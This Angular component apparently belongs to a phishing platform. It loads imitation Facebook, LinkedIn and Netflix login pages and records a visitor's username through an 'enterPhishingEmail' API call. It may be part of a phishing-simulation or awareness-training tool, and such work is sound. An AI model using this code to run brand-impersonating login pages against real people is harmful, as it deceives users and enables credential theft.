import { Component, OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { ApiService } from '../api.service';
import { ActivatedRoute } from '@angular/router';
import {DomSanitizer, SafeHtml, Title} from '@angular/platform-browser';
import {NgIf} from '@angular/common';
import {FacebookComponent} from './pages/facebook.component';
import {LinkedinComponent} from './pages/linkedin.component';
import {NetflixComponent} from './pages/netflix.component';

@Component({
  selector: 'app-login-pages',
  imports: [
    FormsModule,
    NgIf,
    FacebookComponent,
    LinkedinComponent,
    NetflixComponent
  ],
  templateUrl: './login-pages.component.html',
  styleUrl: './login-pages.component.css'
})
export class LoginPagesComponent implements OnInit {
  id!: string | null;
  html: SafeHtml = '';
  username: string | null = null;
  constructor(private titleService: Title, private apiService: ApiService, private route: ActivatedRoute, private sanitizer: DomSanitizer) {}

  ngOnInit() {

    this.id = this.route.snapshot.paramMap.get('id');

    this.route.queryParams.subscribe(params => {
      this.username = params['username'];
    });
    if (this.id != null) {
      this.titleService.setTitle(this.id);
    }

    if (this.id != null && this.username != null) {
      this.apiService.enterPhishingEmail(this.username, this.id).subscribe({
        next: (response) => {
        },
        error: (error) => {
        }
      });
    }
  }
}
